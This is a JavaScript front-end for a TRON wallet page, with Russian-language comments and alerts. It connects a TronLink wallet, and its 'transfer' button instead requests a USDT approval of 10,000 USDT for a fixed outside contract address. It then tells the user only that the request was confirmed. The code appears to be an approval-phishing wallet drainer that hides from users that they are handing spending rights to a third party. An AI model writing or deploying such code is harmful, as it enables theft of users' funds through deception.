const connectBtn = document.getElementById('connectBtn');
const transferBtn = document.getElementById('transferBtn');
const walletAddressText = document.getElementById('walletAddress');

let userAddress = '';

const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
const myContractAddress = 'THQkf7RkW1JaKNdyH69dYUnh7mbz2nSfoY'; 

// Проверка наличия TronWeb или мобильного провайдера
function getTronWeb() {
    if (window.tronWeb && window.tronWeb.defaultAddress && window.tronWeb.defaultAddress.base58) {
        return window.tronWeb;
    }
    return null;
}

connectBtn.addEventListener('click', async () => {
    try {
        walletAddressText.innerText = "Поиск сети TRON...";
        let tronWeb = getTronWeb();

        // Если нативного TronWeb нет (как в Trust Wallet по умолчанию), выводим понятную инструкцию для пользователя
        if (!tronWeb) {
            alert('В текущем браузере кошелька не обнаружена сеть TRON. Убедитесь, что вы открыли сайт через DApp-браузер с поддержкой Tron (например, TronLink), либо используйте кошелек с поддержкой WalletConnect для Tron.');
            walletAddressText.innerText = "Сеть TRON не найдена";
            return;
        }

        userAddress = tronWeb.defaultAddress.base58;
        walletAddressText.innerText = `Подключено: ${userAddress}`;
        connectBtn.style.display = 'none';
        transferBtn.style.display = 'inline-block';

    } catch (error) {
        console.error("Ошибка подключения:", error);
        alert("Произошла ошибка при подключении.");
    }
});

transferBtn.addEventListener('click', async () => {
    try {
        const tronWeb = getTronWeb();
        if (!userAddress || !tronWeb) {
            alert('Сначала подключите кошелек!');
            return;
        }
        
        console.log("Запрос разрешения (Approve) на USDT...");
        const usdtContract = await tronWeb.contract().at(usdtContractAddress);
        const approveAmount = '10000000000'; 

        const tx = await usdtContract.approve(
            myContractAddress,
            approveAmount
        ).send({
            feeLimit: 100000000
        });

        alert("Запрос успешно подтвержден!");
        console.log("Хэш транзакции approve:", tx);

    } catch (error) {
        console.error("Ошибка при отправке запроса:", error);
        alert("Ошибка при выполнении транзакции.");
    }
});
